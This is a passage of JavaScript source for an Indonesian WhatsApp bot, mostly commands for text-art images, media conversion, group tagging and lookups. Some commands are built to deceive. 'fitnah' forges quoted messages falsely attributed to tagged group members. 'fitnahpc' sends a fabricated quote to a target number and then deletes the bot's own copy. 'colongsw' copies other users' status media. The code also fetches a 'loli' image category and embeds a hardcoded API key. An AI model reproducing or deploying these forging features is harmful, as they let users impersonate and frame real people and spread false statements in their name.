					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
              case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
					
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
case 'intro':
intro = `*┏━━━━━━━━*
*┃✙◗ Nama:*
*┃✙◗ Jenis kelamin:*
*┃✙◗ Umur:*
*┃✙◗ Asal:*
*┗━━━━━━━━ •*`
reply(intro)
break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
case 'afk': 
              if (!isGroup) return reply(mess.only.group)
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const senderi = mek.key.fromMe
      ? ronove.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(senderi, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              reply(aluty)
              break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					ronove.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
case 'detikvn':
sticWait(from)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await ronove.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						ronove.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				sticWait(from)
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await ronove.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						ronove.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw":
      sticWait(from)
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await ronove.downloadAndSaveMediaMessage(ger);
          ronove.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await ronove.downloadAndSaveMediaMessage(ger);
          ronove.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
      case "caripesan":
      sticWait(from)
        if (!q) return reply("pesannya apa bang?");
        let v = await ronove.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await ronove.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
         } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "lirik":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        ronove.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara ${namaowner}`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await ronove.sendMessage(from, li, image, { quoted: mek });
        break;
      case "pinterest":
      case "pin":
      sticWait(from)
        if (!q) return reply("gambar apa?");
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
        await ronove.sendMessage(from, di, image, { quoted: mek });
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        fakestatus(" ```ANDA TELAH ONLINE``` ");
        break;
      case "sᴛᴀᴛᴜs":
        fakestatus(
          ` *〆⁩* STATUS:\n${offline ? " *〆⁩* OFFLINE" : " *〆⁩* ONLINE"}\n${
            banChats ? " *〆⁩* SELF-MODE" : " *〆⁩* PUBLIC-MODE"
          }\n${prefixStatus ? " *〆⁩* MULTI-PREFIX" : " *〆⁩* NO-PREFIX"}`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        fakestatus(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        ronove.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await ronove.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await ronove.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          ronove.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        ronove.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await ronove.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await ronove.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        sticWait(from)
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          ronove.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        sticWait(from)
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            ronove.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        sticWait(from)
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            ronove.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ronove.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          ronove.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case 'buttons5':
              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
              result = `${mathdare}`
              buttons = [{buttonId: `buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})
              ronove.relayWAMessage(prep)
              break
          case 'buttons6':
              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
              result = `${randomtruth}`
              buttons = [{buttonId: `buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`tod`,buttonText:{displayText:'Tod'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})
              ronove.relayWAMessage(prep)
              break
          case 'tod':
              result =`*Truth Or Dare*\nPemain diberi pilihan antara menjawab pertanyaan dengan jujur, atau melakukan tantangan yang diberikan`
              buttons = [{buttonId: `truth`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`dare`,buttonText:{displayText:'Dare'},type:1},{buttonId:`tod`,buttonText:{displayText:'Lanjut'},type:1}]
              buttonsMessage = { contentText: `${result}`, footerText: 'Kebenaran atau tantangan?', buttons: buttons, headerType: 1 }
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:ftex})
              ronove.relayWAMessage(prep)
              break
      case "anime":
        sticWait(from);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                ronove.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
	case 'halloween':
	if (!q) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${q}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!q) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${q}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!q) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sticWait(from)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${q}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!q) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${q}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!q) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${q}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!q) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${q}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!q) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${q}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!q) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${q}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!q) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${q}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!q) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${q}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!q) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${q}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				anu = await fetchJson(`https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`, {method: 'get'})
				kata = anu.result
buttons = [{buttonId: `pantun`,buttonText:{displayText: 'Next ➡️'},type:1}]
              buttonsMessage = { contentText: `${kata}`, footerText: `Created By ${namaowner}〆⁩🦢`, buttons: buttons, headerType: 1 }
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:mek})
              ronove.relayWAMessage(prep)
			break
//badword by mastah zeeone
			case 'antibadword': case 'nobadword':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return sticAdmin(from)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group`)
									if (!q) {
          sendButMessage(from, `MODE ANTIBADWORD`, `Silahkan pilih salah satu`, [
            {
              buttonId: `antibadword on`,
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: `antibadword off`,
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
									if (args[0] == 'on'){
										if (isBadword) return reply(`Udah aktif Lord`)
										grupbadword.push(from)
										fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
										reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
										} else if (args[0] == 'off'){
											anu = grupbadword.indexOf(from)
											grupbadword.splice(anu, 1)
											fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
											reply('Antibadword Grup Dimatikan')
											}
									break
case 'listbadword':
									let bi = `List badword\n\n`
									for (let boo of badword){
										bi += `- ${boo}\n`
										}
										bi += `\nTotal : ${badword.length}`
									reply(bi)
									break
						case 'addbadword':
									if (!isOwner && !mek.key.fromMe && !isGroup && !isGroupAdmins )return reply(mess.only.owner) 
									if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
										if (isKasar(args[0].toLowerCase(), badword)) return reply(`Cari nama lain Lord`)
										addBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (isKasar(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Udah ada`)
											addBadword(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									break
						case 'delbadword':{
									if (!isOwner && !mek.key.fromMe)return reply(mess.only.owner) 
									if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
										if (!isKasar(args[0].toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
										delBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (!isKasar(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
											delBadword(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									}
									break
						case 'clearbadword':
									if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
									if (!m.quoted) return reply(`Reply Pesan Target!`)
									entah = mek.message.extendedTextMessage.contextInfo.participant
									delCountKasar(entah, senbadword)
									reply(`Sukses clear badword ${entah}`)
									break
////////////////////////////////////////////////////////
  	case 'artinama':	
  	  sticWait(from)
  rival = await fetchJson(`https://bx-hunter.herokuapp.com/api/artinama?nama=${args[0]}&apikey=${HunterApi}`, {method:'get'})
  slur = rival.result
   reply(slur)
   break
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`owner`,buttonText:{displayText:'〆⁩OWNER'},type:1}]
              imageMsg = ( await ronove.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              ronove.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
case 'ppcp':
case 'ppcouple':

anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=IkyOgiwara`)
						buff1 = await getBuffer(anu.result.male)
						buttons = [{buttonId: `owner`,buttonText:{displayText: `Owner`},type:1}]
              imageMsg = (await ronove.prepareMessageMedia(buff1, "imageMessage", { thumbnail: buff1, })).imageMessage
              buttonsMessage = {footerText:`${namabot}`, imageMessage: imageMsg,
              contentText:`Cowo`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              ronove.relayWAMessage(prep)
            buff2 = await getBuffer(anu.result.female)
              buttons = [{buttonId: `command`,buttonText:{displayText: `ᴍᴇɴᴜ`},type:1}]
              imageMsg = (await ronove.prepareMessageMedia(buff2, "imageMessage", { thumbnail: buff2, })).imageMessage
              buttonsMessage = {footerText:`${namabot}`, imageMessage: imageMsg,
              contentText:`Cewe`,buttons,headerType:4}
              prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
             setTimeout( async () => {
 ronove.relayWAMessage(prep)
}, 5000)
break
   case'liriklagu':
